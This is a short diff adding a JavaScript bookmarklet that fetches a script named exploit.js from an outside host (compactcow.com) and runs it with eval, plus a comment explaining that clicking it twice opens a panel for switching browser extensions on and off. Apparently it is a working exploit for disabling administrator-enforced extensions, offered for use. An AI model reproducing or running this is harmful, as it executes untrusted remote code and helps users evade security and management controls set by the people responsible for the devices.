@@ -1,0 +1,3 @@
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+
+//make a bookmarklet with the code above. Run it anywhere and it should bring you to a 404. Click it again and you should have a panel where you can turn on and off extensions.
